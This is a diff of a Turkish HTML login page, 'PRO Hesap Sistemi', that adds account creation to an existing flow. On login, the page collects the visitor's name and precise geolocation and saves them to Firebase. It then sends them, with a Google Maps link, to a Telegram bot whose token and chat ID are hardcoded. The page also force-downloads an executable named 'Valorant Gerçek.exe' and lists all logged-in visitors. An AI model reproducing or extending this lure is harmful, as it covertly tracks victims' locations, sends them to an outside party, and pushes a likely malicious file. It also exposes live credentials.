@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>PRO Giriş</title>
+  <title>PRO Hesap Sistemi</title>
   <style>
     body {
       margin: 0;
@@ -11,7 +11,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-top: 60px;
+      padding-top: 40px;
     }
     #box {
       background: #fff;
@@ -23,17 +23,23 @@
     }
     input, button {
       padding: 10px;
-      margin: 10px 0;
+      margin: 8px 0;
       width: 100%;
       font-size: 16px;
+      box-sizing: border-box;
+    }
+    #msg {
+      height: 1.2em;
+      margin: 10px 0;
+      color: red;
     }
     #downloadLink {
       display: none;
-      margin-top: 20px;
+      margin-top: 15px;
     }
     #videoSection {
       display: none;
-      margin-top: 20px;
+      margin-top: 15px;
     }
     #videoSection iframe {
       width: 100%;
@@ -54,27 +60,29 @@
       border-radius: 5px;
       box-shadow: 0 0 4px rgba(0,0,0,0.1);
     }
-    #sonuc { height: 1.2em; }
   </style>
 
-  <!-- Firebase 8.x CDN -->
+  <!-- Firebase 8.x -->
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
 
   <div id="box">
-    <h2>İsmini Yaz</h2>
-    <input id="isim" placeholder="Adın" />
-    <button id="girisBtn">Giriş Yap</button>
-    <p id="sonuc" style="color:red;"></p>
+    <h2>PRO Hesap Sistemi</h2>
+    <input id="isim" placeholder="Adınızı girin" />
+    <button id="createBtn">Hesap Aç</button>
+    <button id="loginBtn">Giriş Yap</button>
+    <div id="msg"></div>
 
     <a id="downloadLink" href="Valorant Gerçek.exe" download>
       Valorant Gerçek.exe İndir
     </a>
 
     <div id="videoSection">
-      <iframe id="youtubeFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+      <iframe id="youtubeFrame"
+        src="" allow="autoplay; encrypted-media" allowfullscreen>
+      </iframe>
     </div>
   </div>
 
@@ -97,9 +105,39 @@
     var BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
     var CHAT_ID   = "8499614707";
 
-    // Telegram'a mesaj gönder
+    function setMessage(text, color = "red") {
+      var msg = document.getElementById("msg");
+      msg.style.color = color;
+      msg.textContent = text;
+    }
+
+    // Hesap oluşturma
+    function hesapAc() {
+      var isim = document.getElementById("isim").value.trim();
+      if (!isim) {
+        setMessage("Ad alanı boş olamaz.");
+        return;
+      }
+      // Aynı isimde hesap var mı kontrol et
+      db.ref("accounts")
+        .orderByChild("isim")
+        .equalTo(isim)
+        .once("value", function(snap) {
+          if (snap.exists()) {
+            setMessage("Bu hesap zaten var.");
+          } else {
+            db.ref("accounts").push({
+              isim: isim,
+              tarih: new Date().toISOString()
+            });
+            setMessage("Hesap oluşturuldu!", "green");
+          }
+        });
+    }
+
+    // Telegram mesaj gönderme
     function telegramaGonder(isim, konum) {
-      var mesaj = 
+      var mesaj =
         "🧑 İsim: " + isim +
         "\n📍 Konum: https://www.google.com/maps?q=" +
         konum.lat + "," + konum.lon;
@@ -113,66 +151,63 @@
       );
     }
 
-    // Giriş fonksiyonu
+    // Giriş yap
     function girisYap() {
-      var isim  = document.getElementById("isim").value.trim();
-      var sonuc = document.getElementById("sonuc");
-      sonuc.textContent = "";
-
+      var isim = document.getElementById("isim").value.trim();
       if (!isim) {
-        sonuc.style.color = "red";
-        sonuc.textContent = "Lütfen adını gir.";
+        setMessage("Lütfen adınızı girin.");
         return;
       }
-
-      if (!navigator.geolocation) {
-        sonuc.style.color = "red";
-        sonuc.textContent = "Konum desteklenmiyor.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        var konum = {
-          lat: pos.coords.latitude.toFixed(6),
-          lon: pos.coords.longitude.toFixed(6)
-        };
-
-        // Firebase kayıt
-        db.ref("girisler").push({
-          isim: isim,
-          konum: konum,
-          tarih: new Date().toISOString()
+      // Hesap kontrol
+      db.ref("accounts")
+        .orderByChild("isim")
+        .equalTo(isim)
+        .once("value", function(snap) {
+          if (!snap.exists()) {
+            setMessage("Hesap bulunamadı.");
+            return;
+          }
+          // Konum iste
+          if (!navigator.geolocation) {
+            setMessage("Konum desteklenmiyor.");
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            var konum = {
+              lat: pos.coords.latitude.toFixed(6),
+              lon: pos.coords.longitude.toFixed(6)
+            };
+            // Giriş kaydı
+            db.ref("girisler").push({
+              isim: isim,
+              konum: konum,
+              tarih: new Date().toISOString()
+            });
+            // Telegram bildirimi
+            telegramaGonder(isim, konum);
+            setMessage("Hoş geldin, " + isim + "!", "green");
+            // İndirme
+            var dl = document.getElementById("downloadLink");
+            dl.style.display = "block";
+            dl.click();
+            // YouTube
+            var vidSec = document.getElementById("videoSection");
+            var frame  = document.getElementById("youtubeFrame");
+            frame.src = "https://www.youtube.com/embed/PCMJtCjfxpw?autoplay=1";
+            vidSec.style.display = "block";
+          }, function(err) {
+            setMessage("Konum alınamadı: " + err.message);
+          });
         });
-
-        // Telegram bildirimi
-        telegramaGonder(isim, konum);
-
-        // Başarı mesajı
-        sonuc.style.color = "green";
-        sonuc.textContent = "Hoş geldin, " + isim + "!";
-
-        // İndirme linki ve tıklama
-        var dl = document.getElementById("downloadLink");
-        dl.style.display = "block";
-        dl.click();
-
-        // YouTube videosunu gömme ve oynatma
-        var vid = document.getElementById("videoSection");
-        var frame = document.getElementById("youtubeFrame");
-        frame.src = "https://www.youtube.com/embed/VIDEO_ID?autoplay=1";
-        vid.style.display = "block";
-
-      }, function(err) {
-        sonuc.style.color = "red";
-        sonuc.textContent = "Konum alınamadı: " + err.message;
-      });
     }
 
-    // Butonu dinle
-    document.getElementById("girisBtn")
+    // Event listener
+    document.getElementById("createBtn")
+      .addEventListener("click", hesapAc);
+    document.getElementById("loginBtn")
       .addEventListener("click", girisYap);
 
-    // Listeyi güncelle
+    // Giriş yapanları listele
     db.ref("girisler").on("value", function(snapshot) {
       var data = snapshot.val() || {};
       var ul   = document.getElementById("liste");
